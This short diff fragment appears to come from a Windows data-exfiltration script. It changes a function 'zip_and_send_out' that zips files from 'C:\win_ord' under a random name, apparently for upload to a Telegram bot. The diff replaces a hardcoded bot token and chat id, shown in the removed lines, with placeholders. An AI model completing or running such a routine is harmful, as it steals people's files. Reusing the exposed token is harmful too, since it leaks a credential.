@@ -464,8 +464,8 @@ def generate_random_string(n):
 
 
 def zip_and_send_out():
-    chat_id =  "-1001968210560"
-    token = "6117801998:AAHE-TBVbiURBxqpKr_JqLLs5optKu3PC7o"
+    chat_id =  "CHAT_ID"
+    token = "BOT_TOKEN"
     random_string = generate_random_string(15)
     zip_name = f"{random_string}.zip"
     folder_path = "C:\\win_ord"
